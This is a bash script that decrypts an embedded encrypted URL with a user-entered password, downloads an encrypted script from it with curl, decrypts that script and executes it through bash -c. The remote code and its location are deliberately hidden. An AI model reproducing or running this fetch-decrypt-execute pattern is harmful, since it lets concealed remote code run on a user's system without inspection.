#!/bin/bash

# Function to decrypt text
decrypt_text() {
    echo -n "$1" | base64 -d | openssl enc -d -aes-256-cbc -a -pbkdf2 -k "$password" | sed "s/@@@@@@@/\n/g"
}

# Function to securely clear sensitive data
clear_sensitive_data() {
    unset password
    unset decrypted_url
    unset script_url
}

# Decrypting the URL of the script to download
echo "Enter password:"
read -s password
decrypted_url=$(decrypt_text "VTJGc2RHVmtYMTlpT2o5a3dMd3Y2UDVZbjVMN2F3cUV1Q3pWRFJ4dlNvKzNRcVhFc2ZWbWV0M0ovcFRkZ1dHSworOEQ2TTd4RFVQVy9jTkFmU2IzTmlZVkU4WnRqNmh5a1lGWWd4NTIyUGVvPQo=")
script_url=$(echo -n "$decrypted_url" | sed "s/@@@@@@@/\n/g")

# Downloading the script from the decrypted URL
encrypted_script=$(curl -sL "$script_url")

# Decrypting the downloaded script
decrypted_script=$(decrypt_text "$encrypted_script")

# Running the decrypted script in the current session
if [[ -n "$decrypted_script" ]]; then
    bash -c "$decrypted_script"
    clear_sensitive_data
else
    echo "Unable to decrypt and run the script. Check the password or URL."
    clear_sensitive_data
fi
